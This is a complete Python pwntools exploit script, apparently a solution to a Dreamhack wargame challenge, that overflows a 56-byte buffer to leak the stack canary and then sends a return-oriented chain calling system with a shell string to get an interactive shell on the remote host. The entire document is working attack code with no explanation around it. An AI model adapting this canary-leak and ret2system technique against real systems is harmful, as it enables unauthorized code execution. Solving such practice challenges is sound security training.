from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 20377
r = remote(HOST, PORT)

sh=0x400874
pop_rdi=0x400853
system_plt=0x4005d0
ret=0x400596

r.sendlineafter(b': ', b'A' * 56)
r.recvline()
canary = u64(r.recvline().strip()[:7].ljust(8, b'\x00')) << 8
payload = b'A' * 56 + p64(canary) + b'A' * 8 + p64(ret) + p64(pop_rdi) + p64(sh) + p64(system_plt)
r.sendlineafter(b': ', payload)
r.interactive()